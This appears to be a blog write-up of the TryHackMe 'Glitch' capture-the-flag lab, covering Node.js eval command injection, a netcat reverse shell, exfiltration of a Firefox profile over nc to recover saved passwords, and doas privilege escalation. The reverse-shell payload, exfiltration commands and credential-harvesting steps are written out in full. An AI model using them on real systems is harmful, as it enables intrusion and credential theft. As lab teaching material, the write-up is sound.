---
title: "Glitch_writeup"
date: 2021-04-23T20:08:53-03:00
draft: false
featured: true
toc: false
summary: "A Challenge showcasing a web app and simple privilege escalation. Can you find the glitch? well, let's find out. Shall we?"
images:
  - "img/glitch_cover.jpeg"
cover: "img/glitch_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
  - glitch
  - firefox
  - ffuf
  - infamous55
---

# THM - Glitch

This time we'll hack through `Glitch` a THM room created by [infamous55](https://tryhackme.com/p/infamous55) Check it out in the link below.


- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/glitch).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


## Let's get glitchy!

We start with an nmap scan along with a Gobuster scan:

`sudo nmap -sV -A -T4 10.10.231.82`
and then we run Gobuster:
`gobuster dir -u http://10.10.231.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 `

![](https://i.imgur.com/dpGAVV0.png)

We can also run a Nikto scan:

`nikto -h 10.10.231.82`

Ok while we wait for all those scans to complete, we can start looking into the website itself. After loading it we don't get much more than a glitchy image and that's it. But when we inspect the storage of the webpage, we notice a token cookie is created. However the cookie value does not seem to be usefult, it just shows "value". 

![](https://i.imgur.com/MCYxyAr.png)

If we pay attention to the title of the page, as displayed on the browser tab we can see it reads "not allowed" this leads me to think we should somehow play with the cookie we found, more exactly with its value and we might be able to get access to this page.

let's look at the code of the page and see if there is any other lead there:

![](https://i.imgur.com/HOKC0vR.png)

We see an interesting script with a `getAccess()` function. Let's see if we can call that function from the browser's console itself to figure out what it does:

![](https://i.imgur.com/Qbq6KML.png)

If we just call the function as it is, by just writing `getAccess()` in the console and pressing enter, we see it returns a token. Right away this seems to be related to the `token` cookie we saw before.


The token returned by the function could very well be, the value that we need to pass to the token cookie. But if you see the format of the value, you might be with me in suspecting this is an encoded string. Let's see if we can decode it:

![](https://i.imgur.com/a8Y6375.png)

We simply echo the string value we got from the function and pipe that into the base64 utility in decode mode and we get a string back, which seems to be the first answer requested by the room. Hence it is masked, so you don't just copy and paste it. Replicate the steps on your end along with me and have some fun in the process.


Having now the value of the decoded token, returned by the function. We can go ahead and use this string as the value of our `token` cookie.

![](https://i.imgur.com/MLi7SNo.png)

Once the token's value is in place, let's see if anything happens when refreshing the page.

![](https://i.imgur.com/zzoCHJS.jpg)

Indeed the page changes its content and shows us that quite sad image and text you see above. Scrolling down through the page, shows some button that will kind of filter some boxes with more sad dark things:

![](https://i.imgur.com/fVd0zGp.png)

If we scroll down through the page, we can see at the very bottom a `click me` link. That upon being clicked just scrolls the page up to the top.

Let's check those other directories that GoBuster found for us and see if we found anything interesting. Let's start off by navigating to `/secret` (notice the lowercase s in that word):

When accessing that path we see the following:

![](https://i.imgur.com/3s0FeCt.png)

And after inspecting the HTML of that page we see that there is not much going on there, just the same image used as a background pattern.

Let's look at the other path `/Secret` with a capital S. And we get the exact same image repeated as a background and again nothing apparently of interest in the HTML of that page.

Let's look back at the previous page, not secret but the home page we got with that click me link. One thing I forgot to check is there, in that file there is a `/js/script.js` file that we never looked at.

Let's see what it contains:

![](https://i.imgur.com/M0Rhk7F.png)

Right away I see something interesting there, it seems we have an endpoint we can try, that `/api/items`. Let's take a look at what it does:

![](https://i.imgur.com/bEfbgmu.png)

So this seems to perform a get request and returns a set of values for `sins` and `deaths`. Not much there, but we can try to see what would happen if instead of a GET request we try a POST request.

We can do that with different tools, Burp, postman, right from the terminal but in this case I'll be using RESTer a Firefox extension. Once installed we can perform the same get request to see if it works fine:

![](https://i.imgur.com/hMS3nhy.png)
It works fine so let's change the METHOD from GET to POST and see what happens:

![](https://i.imgur.com/ygQbbdj.png)

Ok so we see there is indeed a different response, we might think that when sending the right command we might be able to obtain yet another response that could give us a lead. At this point we need to find which command could possibly this API be expecting to let us get further down this room.

It's fuzzing time! Let's see if we can fuzz this with ffuf:

`ffuf -w /usr/share/wordlists/wfuzz/general/medium.txt -X POST -u http://10.10.231.82/api/items\?FUZZ=test -fc 400 -mc 500`

We run ffuf to fuzz POST requests, we filter all 400 response codes and we look out for 500 code errors that could mean that the parameter is correct but the value we are passing to it is not. Let's run it and see what it finds.

![](https://i.imgur.com/eMRJ7Cw.png)

It seems we have the 'cmd' command detected as available, let's see what this command does. Back to RESTer to send a new request:

![](https://i.imgur.com/VOY0jdL.png)

With this request we have obtained a lot of useful information: we know there is a nodeJS app running, we know there is an Eval function that takes the input and we know that even though CMD is a valid command the value we passed into it is not.

We need to search if there is any way of exploiting this Eval function from NodeJS. Time to google around. Wait for me...


If we look at the glorious PayloadsOfAllTheThings repo, we see there is some way of exploiting NodeJS: [Check it here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)

It seems we can exploit the `require` child process from NodeJS, something like this:

`require('child_process').exec('nc -e /bin/sh 10.13.0.34 2112')`

Let's try that out in another POST request, but first we need to fire up a netcat listener to catch the eventual reverse shell:

`nc -nlvp 2112` Yup, I'm sticking to my favorite port again.

![](https://i.imgur.com/iIfs3do.png)

Even though the request seems to have worked, we are not getting any reverse shell connection back to us. Time to try another payload for that `.exec()` argument. Let's try with the classic `nc` reverse shell, again this is listed in the same PayloadOfAllTheThings: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd). I've used this one in the past, and it worked fine. Let's see if it does this time as well:


![](https://i.imgur.com/lnTNLMq.png)

This time we get another error, meaning that some of the characters we sent in our request are possibly being filtered out or causing errors. One very basic thing we can try is to URL encode the payload, not just the nc payload, but the entire thing from the `require` using cyberChef.

![](https://i.imgur.com/ODSMQ7x.png)

Now let's copy paste that encoded payload and use it in our request with RESTer:

![](https://i.imgur.com/RpiFHO9.png)

It worked! We got the initial access to the target. Let's see what we can find browsing around the files in the target:

![](https://i.imgur.com/SWGQX1y.png)

With that we found the first flag, now we need to chase that root access. One interesting thing to mention here, is that we see a `.firefox` folder. I know there are some way of exploiting that folder since it usually contains username and passwords we can possibly leverage. But for now let's fire up linpeas and see what it can find for us.

Let's fire up a local python3 http server so we can upload, make sure to have a Linpeas.sh copy ready in the same folder where you spin up that HTTP server: `sudo python3 -m http.server 80` and then from our reverse shell, having browsed to `/tmp` we simply wget that file:

![](https://i.imgur.com/28JMrl5.png)

Before we go further let's get ourselves a better shell, by using Python TTY: `python -c 'import pty;pty.spawn("/bin/bash")'`

Now let's run `chmod +x linpeas.sh` and the run linpeas with `./linpeas.sh`:

![](https://i.imgur.com/VLxLw3b.png)

Let's wait for a bit while Linpeas does it's thing.


If we look at one the findings returned by Linpeas, we see the there is a user named `v0id` which can apparently is permitted to run `doas` as root:

![](https://i.imgur.com/QaKWnNU.png)

If we scroll the Linpeas results a bit up, we'll see that doas is indeed available in the system:

![](https://i.imgur.com/dYYuseV.png)

If you remember when we find the user.txt flag we also saw a .firefox directory that I mention could be exploitable. We'll I think we need to look into that right now and see if it might contain the password of the username v0id. So let's navigate back to the home directory and see if we can get that folder back to our machine for further analysis:

We start by compressing that folder into a tgz file with this command: `tar -cvf firefox.tgz .firefox`

Now in our attack box we run a listener: `nc -nlvp 2113 > firefox.tgz`

And from the reverse shell session we send the file to our attack box using netcat as well: `nc 10.13.0.34 2113 < firefox.tgz`

![](https://i.imgur.com/i8NlTAb.png)

After a bit we should get that file in our kali machine. Which we unpack by running `tar xvf firefox.tgz .firefox`

Now we can just spin up firefox from the terminal specifying that profie we got and we should be able to see the stored credentials:

`firefox --profile .firefox/b5w4643p.default-release --allow-downgrade`

![](https://i.imgur.com/DFHUlgM.png)

And just like that we got v0id's password. Let's get back to our reverse shell and switch user. And then we just need to leverage `doas` to run as root and get the flag:

![](https://i.imgur.com/W1hucm5.png)

That's it we managed to complete the room, this was a very interesting one I've never exploited a firefox profile before so I definitely learned a new trick! Thanks for that room creator!


I hope you enjoy this one as much as I did, happy hacking!

tzero86.


{{< thm_badge >}}
